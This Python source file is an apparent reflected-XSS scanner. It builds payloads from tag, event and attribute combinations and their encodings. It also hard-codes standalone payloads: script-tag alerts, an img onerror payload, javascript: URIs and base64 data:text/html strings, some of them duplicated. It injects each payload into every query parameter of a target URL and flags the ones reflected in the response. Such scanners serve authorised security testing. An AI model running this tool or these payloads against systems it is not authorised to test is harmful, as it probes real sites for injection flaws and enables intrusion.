import asyncio
import aiohttp
from urllib.parse import urlparse, parse_qs, urlencode
from itertools import product
from utils.constants import TAGS,EVENTS,ATTRIBUTES,ENCODINGS,PAYLOAD_TEMPLATES

def generate_payloads():
    payloads = set()
    
    # Generate base payloads with all combinations
    for tag, event, attr in product(TAGS, EVENTS, ATTRIBUTES):
        for template in PAYLOAD_TEMPLATES:
            # Format the template with current tag, event, and attr
            payload = template.format(tag=tag, event=event, attr=attr)
            payloads.add(payload)
    
    # Add variations with different encodings
    encoded_payloads = set()
    for payload in payloads:
        for encoding_name, encoder in ENCODINGS.items():
            encoded = encoder(payload)
            encoded_payloads.add(encoded)
    
    # Add common standalone payloads
    encoded_payloads.update([
        "'><script>alert('XSS')</script>",
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS");',
        'alert("XSS")',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4%3D',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgnc1x1YnV0dW5lcycpOzwvc2NyaXB0Pg==',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+'
    ])
    
    return list(encoded_payloads)

async def test_request(session, url):
    try:
        async with session.get(url, timeout=5) as response:
            return await response.text()
    except Exception:
        return None

async def run_xss_scan(target_url: str):
    parsed_url = urlparse(target_url)
    query_params = parse_qs(parsed_url.query)

    if not query_params:
        return {
            "status": "success",
            "message": "No parameters found in URL",
            "scan_results": []
        }

    payloads = generate_payloads()
    scan_results = []

    async with aiohttp.ClientSession() as session:
        tasks = []
        for param in query_params:
            for payload in payloads:
                # Create modified parameters
                modified_params = {k: v.copy() for k, v in query_params.items()}
                modified_params[param] = [payload]
                modified_query = urlencode(modified_params, doseq=True)
                modified_url = parsed_url._replace(query=modified_query).geturl()

                # Create task and store metadata
                task = asyncio.create_task(test_request(session, modified_url))
                tasks.append((task, param, payload, modified_url))

        # Process all tasks with concurrency control
        for i in range(0, len(tasks), 50):
            chunk = tasks[i:i+50]
            for task_info in chunk:
                task, param, payload, modified_url = task_info
                response_text = await task
                if response_text and payload in response_text:
                    scan_results.append({
                        "parameter": param,
                        "payload": payload,
                        "url": modified_url,
                        "evidence": response_text[:200]  # First 200 chars of response
                    })

    return {
        "status": "success",
        "message": "XSS scan completed",
        "target_url": target_url,
        "scan_results": scan_results
    }

